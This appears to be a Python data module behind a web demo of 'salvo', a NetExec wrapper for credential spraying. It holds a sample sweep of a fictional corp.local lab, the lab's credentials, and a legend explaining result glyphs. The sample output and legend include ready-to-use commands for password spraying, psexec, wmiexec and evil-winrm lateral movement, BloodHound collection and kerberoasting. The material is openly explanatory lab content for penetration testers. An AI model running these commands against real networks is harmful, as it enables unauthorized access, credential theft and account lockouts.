"""What the salvo page's terminal runs on.

The terminal is a working salvo: it parses the arguments you type, plans the
jobs, spends the logons and prints the matrix. It needs three things, and all
three live here — the estate it answers for, the nxc capability tables
transcribed from the top of `salvo.py`, and the verdict legend.

None of this is imitated from memory. During development a NetExec stand-in
serves this same estate to the real `salvo`, and the terminal's output is
diffed against the tool's, line for line, across every command shape the page
accepts. BOOT below is one of those real runs, kept verbatim so the section is
a readable transcript with JavaScript switched off.
"""

from textwrap import dedent


def _d(text):
    """Dedent a transcript and trim the leading newline.

    Column alignment is load-bearing — the matrix is a fixed-width table — so
    it is stored indented for readability here and straightened on import.
    """
    return dedent(text).strip("\n")


# ── The opening run ──────────────────────────────────────────────────
# Real output from `salvo 1.0.0` against the estate below. The terminal
# replays this as it opens and then hands over the prompt; with no
# JavaScript it is simply the content of the section.

BOOT = _d("""
        [*] salvo 1.0.0  |  nxc 1.5.0-lab
        [!] LOCKOUT MATH - each protocol against each host is a separate logon,
            and a domain account's counter lives on the DC, so every host counts.
              jdoe                     up to 2048 logons (8 protocol-jobs x 256 hosts)
            Default AD lockout threshold is often 5. Check it first:
                nxc smb <DC_IP> -u '' -p '' --pass-pol
            Narrow with -P smb,winrm, or spread it out with --stealth.

        [*] 8 nxc process(es), 6 at a time

        [  +  ]  mssql  10.0.0.26        SQL01            jdoe
        [  +  ]  wmi    10.0.0.10        DC01             jdoe
        [  +  ]  wmi    10.0.0.25        WEB01            jdoe
        [  +  ]  wmi    10.0.0.26        SQL01            jdoe
        [  +  ]  wmi    10.0.0.31        FS01             jdoe
        [  ?  ]  winrm  10.0.0.10        DC01             jdoe
        [EXEC ]  winrm  10.0.0.25        WEB01            jdoe
        [  ?  ]  winrm  10.0.0.26        SQL01            jdoe
        [  ?  ]  winrm  10.0.0.31        FS01             jdoe
        [  -  ]  ssh    10.0.0.42        LNX01            jdoe
        [  +  ]  smb    10.0.0.10        DC01             jdoe
        [ADMIN]  smb    10.0.0.25        WEB01            jdoe
        [  +  ]  smb    10.0.0.26        SQL01            jdoe
        [VALID*] smb    10.0.0.31        FS01             jdoe
        [  -  ]  smb    10.0.0.42        LNX01            jdoe
        [  +  ]  ldap   10.0.0.10        DC01             jdoe
        [  -  ]  ftp    10.0.0.25        WEB01            jdoe
        [  -  ]  ftp    10.0.0.42        LNX01            jdoe
        [VALID*] rdp    10.0.0.10        DC01             jdoe
        [  +  ]  rdp    10.0.0.25        WEB01            jdoe
        [  +  ]  rdp    10.0.0.26        SQL01            jdoe

        [*] finished in 0s

        ==============================================================================
         corp.local\\jdoe:Password123! [P]
        ==============================================================================
        host                  smb   winrm     wmi   mssql    ldap     rdp     ssh     ftp
        ---------------------------------------------------------------------------------
        10.0.0.10 (DC01)       ok       ?      ok       -      ok  VALID*       -       - <
        10.0.0.25 (WEB01)   ADMIN    exec      ok       -       -      ok       -       . <
        10.0.0.26 (SQL01)      ok       ?      ok      ok       -      ok       -       - <
        10.0.0.31 (FS01)   VALID*       ?      ok       -       -       -       -       - <
        10.0.0.42 (LNX01)       .       -       -       -       -       -       .       .

          ADMIN  = provably administrative (smb admin-share write, mssql sysadmin)
          exec   = code execution, NOT admin - check the smb column before assuming
          ok     = authenticated    VALID* = password correct, this access path blocked
          ?      = cannot tell, retest elsewhere    . = refused    - = no service / no answer
          !CMD   = nxc REJECTED the command salvo built - this cell was never tested
          n/a    = salvo ran NO job here - a fact about salvo, not about the host
          err    = salvo could not run this job - also not a verdict
          <      = this host answered on at least one protocol


        AUTHENTICATION ATTEMPTS ACTUALLY MADE (a '-' never reached auth):
          jdoe                     21

        NOT A VERDICT - these did not fail, they were blocked or unreadable:
          rdp    as jdoe             password correct, account denied this logon type
                 10.0.0.10
          smb    as jdoe             password correct, account denied this logon type
                 10.0.0.31
          winrm  as jdoe             refused with no status code - on winrm this cannot be told apart from an authorization denial. Do not write the cred off.
                 10.0.0.10, 10.0.0.26, 10.0.0.31
          A credential in this list is still live. Take it to another protocol.

        NEXT:
          10.0.0.25 (WEB01)   smb:ADMIN, winrm:exec, rdp:ok, wmi:ok
              impacket-psexec  corp.local/jdoe:'Password123!'@10.0.0.25
              impacket-wmiexec corp.local/jdoe:'Password123!'@10.0.0.25
              evil-winrm -i 10.0.0.25 -u jdoe -p 'Password123!'
              xfreerdp3 /u:jdoe /p:'Password123!' /v:10.0.0.25 /cert:ignore /drive:kali,/home/kali
          10.0.0.10 (DC01)   smb:ok, wmi:ok   [no admin proven on this host]
              nxc smb 10.0.0.10 -u jdoe -p 'Password123!' --shares   # non-admin still reads shares
          10.0.0.26 (SQL01)   smb:ok, mssql:ok, rdp:ok, wmi:ok   [no admin proven on this host]
              nxc smb 10.0.0.26 -u jdoe -p 'Password123!' --shares   # non-admin still reads shares
              impacket-mssqlclient jdoe:'Password123!'@10.0.0.26 -windows-auth
              xfreerdp3 /u:jdoe /p:'Password123!' /v:10.0.0.26 /cert:ignore /drive:kali,/home/kali   # NOT local admin here - expect to land as a standard user
          10.0.0.31 (FS01)   wmi:ok   [no admin proven on this host]
          domain-wide (LDAP bind works as jdoe)
              nxc ldap 10.0.0.10 -u jdoe -p 'Password123!' --bloodhound -c All --dns-server 10.0.0.10
              nxc ldap 10.0.0.10 -u jdoe -p 'Password123!' --kerberoasting kerb.hashes

        [!] -d was NOT sent to ftp, ssh - those protocols have no domain argument, so nxc authenticated the bare username with no 'corp.local\\' prefix. Those cells answer a different question from the domain columns; on a Windows host they usually resolve to the LOCAL account of the same name.
        """)


# ── What `help` offers ───────────────────────────────────────────────
# Every one of these runs. They are ordered to walk a reader through the
# four claims without asking them to think of a command themselves.

EXAMPLES = [
    ("salvo 10.0.0.0/24 -u jdoe -p 'Password123!' -d corp.local",
     "the full sweep — eight protocols, six hosts, one matrix"),
    ("salvo 10.0.0.0/24 -u jdoe -p 'Password123!' -d corp.local --dry-run",
     "every nxc command it would build, and nothing sent"),
    ("salvo 10.0.0.25 10.0.0.26 10.0.0.31 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth",
     "a hash: watch ssh and ftp go n/a rather than '-'"),
    ("salvo 10.0.0.0/24 -u svc_backup -p 'Summer2025!' -d corp.local",
     "an account at its threshold — the run dies on the first lockout"),
    ("salvo 10.0.0.42 -u root -p toor -P ssh,ftp,smb",
     "the linux box, where -d is withheld because nxc defines none"),
    ("salvo --selftest", "the parser against known nxc output formats"),
    ("salvo --check-nxc -P all", "the capability tables against the installed nxc"),
    ("salvo --scope", "the flags salvo may and may never send"),
    ("salvo --legend", "what every glyph in the matrix means"),
    ("hosts", "the estate this terminal answers for"),
    ("creds", "the accounts it knows about"),
]


# ── The estate the terminal answers for ──────────────────────────────
# A small AD network chosen so one credential demonstrates all four
# claims at once: local admin on one box and not another, the same
# `Pwn3d!` meaning two different things, a correct password behind a
# closed logon path, and a WinRM refusal that cannot be read either way.
#
# During development a NetExec stand-in serves this same table to the real
# `salvo`, and the two outputs are diffed. The page is not imitating the
# tool from memory; it is answering the same questions about the same hosts.

ESTATE = {
    "domain": "corp.local",
    "nxc_version": "1.5.0-lab",
    "salvo_version": "1.0.0",

    # ip, netbios name, OS banner, what is listening
    "hosts": [
        ["10.0.0.10", "DC01", "Windows Server 2022 Build 20348 x64",
         ["smb", "winrm", "wmi", "ldap", "rdp"]],
        ["10.0.0.25", "WEB01", "Windows 10.0 Build 19045 x64",
         ["smb", "winrm", "wmi", "rdp", "ftp"]],
        ["10.0.0.26", "SQL01", "Windows Server 2019 Build 17763 x64",
         ["smb", "winrm", "wmi", "mssql", "rdp"]],
        ["10.0.0.31", "FS01", "Windows Server 2019 Build 17763 x64",
         ["smb", "winrm", "wmi"]],
        ["10.0.0.42", "LNX01", "Ubuntu 22.04", ["ssh", "ftp", "smb"]],
        ["10.0.0.50", "-", None, []],
    ],

    # What each account gets, per host, per protocol.
    #   ok       [+] plain success
    #   pwn      [+] ... (Pwn3d!) - and what that proves depends on the protocol
    #   bad      [-] ... STATUS_LOGON_FAILURE, a genuinely wrong credential
    #   refused  [-] with no status code at all. On winrm this is byte-identical
    #            to a correct password for an account outside Remote Management
    #            Users, which is why it renders '?' and never a failure.
    #   STATUS_* [-] ... with that NT status. Several of them mean the password
    #            is right and only this path is shut.
    #   quiet    no line at all, as though the service never answered
    # nxc's winrm never surfaces an NT status, so every winrm failure arrives
    # as a bare [-]. That is why winrm can only ever be '?' and never '.' -
    # and why a wrong password and an account outside Remote Management Users
    # are indistinguishable there.
    # A listening service not named here answers `bad`; one that is not
    # listening is never reached at all, and renders '-'.
    "creds": {
        "jdoe": {
            "secret": "Password123!", "kind": "p", "scope": "domain",
            "blurb": "an ordinary domain user who happens to be local admin on one box",
            "on": {
                "10.0.0.25": {"smb": "pwn", "winrm": "pwn", "wmi": "ok", "rdp": "ok"},
                "10.0.0.10": {"smb": "ok", "wmi": "ok", "ldap": "ok",
                              "rdp": "STATUS_LOGON_TYPE_NOT_GRANTED", "winrm": "refused"},
                "10.0.0.26": {"smb": "ok", "wmi": "ok", "mssql": "ok", "rdp": "ok",
                              "winrm": "refused"},
                "10.0.0.31": {"smb": "STATUS_LOGON_TYPE_NOT_GRANTED", "wmi": "ok",
                              "winrm": "refused"},
            },
        },
        "svc_sql": {
            "secret": "Winter2026!", "kind": "p", "scope": "domain",
            "blurb": "a service account with sysadmin on the SQL box and little else",
            "on": {
                "10.0.0.26": {"mssql": "pwn", "smb": "ok", "wmi": "ok", "winrm": "refused"},
                "10.0.0.10": {"smb": "ok", "ldap": "ok", "wmi": "ok", "winrm": "refused"},
            },
        },
        "svc_backup": {
            "secret": "Summer2025!", "kind": "p", "scope": "domain",
            "blurb": "already at its lockout threshold - spray this and watch the run die",
            "lockout": True,
            "on": {},
        },
        "Administrator": {
            "secret": "31d6cfe0d16ae931b73c59d7e0c089c0", "kind": "H", "scope": "local",
            "blurb": "a local administrator hash, reused across the workstations",
            "on": {
                "10.0.0.25": {"smb": "pwn", "winrm": "pwn", "wmi": "pwn"},
                "10.0.0.26": {"smb": "pwn", "winrm": "pwn", "wmi": "pwn"},
                "10.0.0.31": {"smb": "pwn", "wmi": "pwn", "winrm": "refused"},
                "10.0.0.10": {"smb": "STATUS_ACCOUNT_DISABLED", "wmi": "quiet",
                              "winrm": "refused"},
            },
        },
        "root": {
            "secret": "toor", "kind": "p", "scope": "local",
            "blurb": "the linux box, for the protocols with no domain concept at all",
            "on": {"10.0.0.42": {"ssh": "pwn", "ftp": "ok", "smb": "bad"}},
        },
    },

    "ports": {"smb": 445, "winrm": 5985, "wmi": 135, "mssql": 1433, "ldap": 389,
              "rdp": 3389, "ssh": 22, "ftp": 21, "nfs": 111, "vnc": 5900},
}


# ── nxc capability tables ────────────────────────────────────────────
# Transcribed from the top of salvo.py. Which protocol parser defines
# which flag is not cosmetic: sending one that does not exist makes
# argparse exit before a packet, and the empty result renders as '-',
# which reads as "nothing listening there". These are the tables
# `salvo --check-nxc` verifies against the installed NetExec.

NXC = {
    "protocols": ["smb", "winrm", "wmi", "mssql", "ldap", "rdp", "ssh", "ftp", "nfs", "vnc"],
    "default_protocols": ["smb", "winrm", "wmi", "mssql", "ldap", "rdp", "ssh", "ftp"],
    "domain_capable": ["smb", "winrm", "wmi", "mssql", "ldap", "rdp"],
    "local_auth_capable": ["smb", "winrm", "wmi", "mssql", "rdp"],   # ldap: a bind is domain-scoped
    "hash_capable": ["smb", "winrm", "wmi", "mssql", "ldap", "rdp"],
    "timeout_flag": {
        "smb": "--smb-timeout", "winrm": "--http-timeout", "wmi": "--rpc-timeout",
        "mssql": "--mssql-timeout", "rdp": "--rdp-timeout", "ssh": "--ssh-timeout",
        "nfs": "--nfs-timeout",
    },
    "defaults": {"threads": 25, "timeout": 15, "parallel": 6},
    "presets": {
        "slow": {"parallel": 3, "threads": 5, "timeout": 30},
        "stealth": {"parallel": 1, "threads": 1, "timeout": 30, "jitter": "3-7", "job_delay": 5},
    },
    # What nxc's one word actually proves, per protocol. Claim 02, in a table.
    "pwn_means": {
        "smb": ["ADMIN", "write access to admin shares - this is local admin"],
        "mssql": ["ADMIN", "sysadmin role on the SQL instance"],
        "winrm": ["EXEC", "can execute - Remote Management Users grants this WITHOUT admin"],
        "ssh": ["EXEC", "uid-0 / sudo probe, unreliable against Windows OpenSSH"],
        "wmi": ["EXEC", "execution at best"],
        "rdp": ["EXEC", "execution at best"],
        "ftp": ["EXEC", "access at best"],
        "ldap": ["EXEC", "access at best"],
        "nfs": ["EXEC", "access at best"],
        "vnc": ["EXEC", "access at best"],
    },
}


# ── The legend, in full ──────────────────────────────────────────────
# `salvo --legend` in the terminal prints the short form the tool does;
# these are the long answers behind each glyph.

VERDICTS = [
    {"key": "ADMIN", "kind": "valid", "name": "Provably administrative",
     "line": "SMB  10.0.0.25  445  WEB01  [+] corp.local\\jdoe:Password123! (Pwn3d!)",
     "means": "On smb, Pwn3d! means nxc wrote to ADMIN$ - real local administrator on "
              "this host. On mssql it means the sysadmin role. Those are the only two "
              "cells salvo will ever call ADMIN.",
     "do": "impacket-psexec corp.local/jdoe:'Password123!'@10.0.0.25"},
    {"key": "exec", "kind": "valid", "name": "Code execution, not admin",
     "line": "WINRM  10.0.0.25  5985  WEB01  [+] corp.local\\jdoe:Password123! (Pwn3d!)",
     "means": "The same word, a different fact. On winrm it means membership of Remote "
              "Management Users, which grants a shell with no administrative rights at "
              "all. Reading it as admin puts a false privilege level in the report.",
     "do": "evil-winrm -i 10.0.0.25 -u jdoe -p 'Password123!'   # NOT local admin here"},
    {"key": "ok", "kind": "valid", "name": "Authenticated",
     "line": "LDAP  10.0.0.10  389  DC01  [+] corp.local\\jdoe:Password123!",
     "means": "The credential authenticated and nothing further was proven. On ldap "
              "that is a working directory bind - enough to collect the domain.",
     "do": "nxc ldap 10.0.0.10 -u jdoe -p 'Password123!' --bloodhound -c All"},
    {"key": "VALID*", "kind": "blocked", "name": "Password correct, this path closed",
     "line": "RDP  10.0.0.10  3389  DC01  [-] corp.local\\jdoe:Password123! "
             "STATUS_LOGON_TYPE_NOT_GRANTED",
     "means": "A [-] line, and the password is provably right. This one, plus "
              "ACCOUNT_DISABLED, PASSWORD_EXPIRED, PASSWORD_MUST_CHANGE and logon-hour "
              "or workstation restrictions. Two-state tooling files every one of them "
              "as a failure and throws away access you already hold.",
     "do": "Take it to another protocol. It is named again under NOT A VERDICT."},
    {"key": "?", "kind": "unknown", "name": "Cannot be told apart",
     "line": "WINRM  10.0.0.10  5985  DC01  [-] corp.local\\jdoe:Password123!",
     "means": "winrm refused with no status code. A correct password for an account "
              "that simply is not in Remote Management Users is byte-identical to a "
              "wrong one. Calling this failed is a guess printed as a fact.",
     "do": "Retest where the answer is readable - smb, or an ldap bind."},
    {"key": ".", "kind": "invalid", "name": "Refused",
     "line": "SMB  10.0.0.42  445  LNX01  [-] corp.local\\jdoe:Password123! "
             "STATUS_LOGON_FAILURE",
     "means": "A confirmed wrong credential. The service answered and said no, with "
              "a reason that leaves no doubt.",
     "do": "Nothing. This one is genuinely dead here."},
    {"key": "-", "kind": "none", "name": "No service, no answer",
     "line": "(no line - nxc produced no result for this host and protocol)",
     "means": "The only glyph that is a statement about the target. Nothing was "
              "listening, or nothing answered in time. Every other empty cell is a "
              "statement about salvo, and each prints its reason under the table.",
     "do": "Check --nxc-timeout before believing it over a tunnel."},
    {"key": "n/a", "kind": "salvo", "name": "salvo ran no job here",
     "line": "n/a   ssh, ftp   nxc defines no -H here, so a hash cannot be tested",
     "means": "A fact about salvo, not the host. Nothing was sent, so no logon was "
              "spent - and the cell says so instead of leaving a blank that renders "
              "as '-'.",
     "do": "Nothing to retest. --json carries it in a not_run array."},
    {"key": "!CMD", "kind": "salvo", "name": "nxc rejected the command",
     "line": "smb   jdoe   exit 2   nxc: error: unrecognized arguments: -d",
     "means": "The cell was never tested. A wrapper that builds a wrong command does "
              "not error visibly - it produces an empty result that reads as a closed "
              "port. salvo marks it, then asks nxc which flag it objected to.",
     "do": "salvo --check-nxc -P all"},
    {"key": "LOCK!", "kind": "blocked", "name": "Account locked out",
     "line": "SMB  10.0.0.10  445  DC01  [-] corp.local\\svc_backup:Summer2025! "
             "STATUS_ACCOUNT_LOCKED_OUT",
     "means": "The one result that ends the run. Every remaining nxc process is killed "
              "immediately rather than finishing the sweep against an account that is "
              "already locked.",
     "do": "nxc smb <DC_IP> -u '' -p '' --pass-pol"},
    {"key": "err", "kind": "salvo", "name": "salvo could not run the job",
     "line": "err   smb   jdoe   <the reason, printed under the table>",
     "means": "A job that died for salvo's own reasons. Also not a verdict, and also "
              "given its own glyph rather than an empty cell.",
     "do": "Re-run it. --logdir keeps the raw nxc text either way."},
]
